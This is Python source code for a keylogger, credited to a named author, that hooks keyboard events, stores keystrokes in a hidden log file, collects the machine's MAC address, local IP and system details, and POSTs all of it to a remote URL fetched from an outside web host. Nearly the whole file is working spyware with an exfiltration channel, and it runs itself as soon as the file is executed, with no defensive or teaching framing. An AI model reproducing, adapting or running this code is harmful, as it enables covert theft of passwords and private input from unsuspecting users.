#Program a  keylogger
#Programmer : Bibhas Das
#Website : https:github.com/Bibhas1205/
#Last Edit : 12 March 2024

import os

def installPkg(pkg): 
        if os.name=='nt':
            os.system("pip install "+pkg)
        else:
            os.system("pip3 install "+pkg)


try:
    import pyxhook
except Exception:
    installPkg(pyxhook)
    import pyxhook

try:
    import requests
except Exception:
    installPkg(request)
    import request

filename=".keystokes.log"


#now we have the location where the keystocks need to send
def fetchURL():
    # Define the URL you want to send the request to
    url = "https://yamata.000webhostapp.com/keylogger/keyloggerIp.txt"
    try:
        # Send a GET request to the URL
        response = requests.get(url)
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Store the response content in the 'url' variable
            url = response.text
    except requests.exceptions.RequestException as e:
        pass
    return url


#now I wnat to fetch more details from this devices to send
#First fetch mac address
def fetchMAC():
    try:
        from uuid import getnode as get_mac
    except Exception as e:
        installPkg("uuid")
        from uuid import getnode as get_mac

    mac=get_mac()
    macString=':'.join(("%012X" % mac) [i:i+2] for i in range(0,12,2))
    return macString

#Second fetch sytem details
def fetchDetails():
    try:
        import platform
    except Exception as e:
        installPkg("platform")
        import platform
    
    res=dict()
    res['node']=platform.node()
    res['machine']=platform.machine()
    res['os']=platform.platform()
    res['processor']=platform.processor()
    return res


#fetch local ip address
def fetchLocalIp():
    # Python Program to Get IP Address
    try:
        import socket
    except Exception:
        installPkg("socket")
        import socket

    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)



def sendKey(key):
    # Create a dictionary with the data you want to send
    data = {"key": key}
    data['mac']=fetchMAC()
    data['localip']=fetchLocalIp()
    data.update(fetchDetails())
    #print(data)
    # Send the POST request
    try:
        response = requests.post(fetchURL(), data=data)
        if response.status_code == 200:
            pass
            print(response.text)
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass


def store(msg):
	f=open(filename,"a")
	f.write("["+msg+"]")
	f.close()

# Creating key pressing event and saving it into a log file
def OnKeyPress(event):
    store(event.Key)
    
def keylogger():

    if(os.path.exists(filename)):
        f=open(filename,'r')
        sendKey(f.read())
        os.remove(filename)

    print("Previous records are send ssuccessfully")

    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    # Set the hook
    new_hook.HookKeyboard()

    try:
        new_hook.start()  # Start the hook
    #except KeyboardInterrupt:
        # User canceled from the command line.
        #pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        pass

keylogger()